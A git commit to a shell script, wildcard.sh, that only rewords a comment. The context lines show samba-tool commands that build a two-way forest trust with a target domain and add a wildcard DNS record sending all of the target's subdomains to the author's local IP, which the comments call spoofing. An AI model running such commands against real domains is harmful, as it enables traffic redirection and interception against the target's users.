6058a3dc1659d6a68eb04680b182738834ebb0ae
Kenneth Strawn <kstrawn0@saddleback.edu>
2025-11-28 20:01:42 -0800

    Improve comments

--- wildcard.sh
+++ wildcard.sh
@@ -14,6 +14,6 @@ localip=${10}
 # Create bidirectional trust necessary to facilitate this kind of spoofing
 sudo samba-tool domain trust create $remdom.$remsuffix --type=forest --direction=both -U $remdom.$remsuffix\\$remdomadmuser --use-krb5-ccache=$remccachepath --local-dc-username=$localdom.$localsuffix\\$localdomadmuser --local-dc-use-krb5-ccache=$localccachepath
 
-# Create wildcard record pointing at our network-facing local IP
+# Create wildcard record pointing all target subdomains at our network-facing local IP
 sudo samba-tool dns zonecreate 127.0.0.1 $remdom.$remsuffix --use-kerberos=required --use-krb5-ccache=$localccachepath
 sudo samba-tool dns add 127.0.0.1 $remdom.$remsuffix "*" A $localip --use-kerberos=required --use-krb5-ccache=$localccachepath
